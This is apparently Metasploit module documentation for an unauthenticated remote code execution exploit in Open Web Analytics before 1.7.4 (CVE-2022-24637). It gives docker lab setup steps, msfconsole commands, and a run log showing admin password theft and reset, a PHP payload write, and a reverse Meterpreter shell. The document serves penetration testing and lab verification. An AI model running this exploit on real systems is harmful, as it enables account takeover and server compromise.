## Vulnerable Application

Open Web Analytics (OWA) before 1.7.4 allows an unauthenticated remote attacker to obtain sensitive user information, which can be used to gain admin privileges by leveraging cache hashes. This occurs because files generated with '<?php (instead of the intended "<?php sequence) aren't handled by the PHP interpreter.

## Verification Steps

1. Start a vulnerable instance of OWA using docker
    - Download https://github.com/Pflegusch/CVE-2022-24637/blob/main/deployment/docker-compose.yml
    - Start the containers: `docker compose up -d`
    - Open http://127.0.0.1:80/
    - Follow installation steps using the envs from the `docker-compose.yml` file
        - Public URL: `http://127.0.0.1/`
        - Database Host (`docker inspect <db-container>` and get `IPAddress`, e.g `172.22.0.2`)
        - Database Port: `3306`
        - Database Name: `owa`
        - Database User: `owa`
        - Database Password: `Demo12+#`
        - Continue
        - Site Domain: `http://127.0.0.1`
        - Admin name: `admin`
        - E-Mail: `admin@admin.com`
        - Password: `Demo12+#`
        - Continue

2. Start `msfconsole`
3. `use exploit/multi/http/open_web_analytics_rce`
4. `set RHOSTS 127.0.0.1`
5. `set RPORT 80`
6. `set SSL false`
7. `set LHOST 172.22.0.1` -> this needs to be bridge IP that got created with the `docker compose up -d` command
8. `check`
9. `run`

```
msf6 exploit(multi/http/open_web_analytics_rce) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 exploit(multi/http/open_web_analytics_rce) > set RPORT 80
RPORT => 80
msf6 exploit(multi/http/open_web_analytics_rce) > set SSL false
SSL => false
msf6 exploit(multi/http/open_web_analytics_rce) > set LHOST 172.22.0.1
LHOST => 172.22.0.1
msf6 exploit(multi/http/open_web_analytics_rce) > check
[+] 127.0.0.1:80 - The target is vulnerable.
msf6 exploit(multi/http/open_web_analytics_rce) > run

[*] Started reverse TCP handler on 172.22.0.1:4444 
[+] Connected to http://127.0.0.1:80/ successfully!
[*] Attempting to find cache of 'admin' user
[+] Found temporary password for user 'admin': b42f457df9d9482324ca8fe041f19f1c
[+] Changed the password of 'admin' to 'pwned'
[+] Logged in as admin user
[*] Creating log file
[+] Wrote payload to file
[*] Sending stage (39927 bytes) to 172.22.0.3
[*] Meterpreter session 3 opened (172.22.0.1:4444 -> 172.22.0.3:47728) at 2023-03-09 13:55:58 +0100
[+] Triggering payload! Check your listener!
[*] You can trigger the payload again at http://127.0.0.1:80/owa-data/caches/ERaG8bho.php

meterpreter > pwd
/var/www/html/owa-data/caches
meterpreter > getuid
Server username: www-data
```
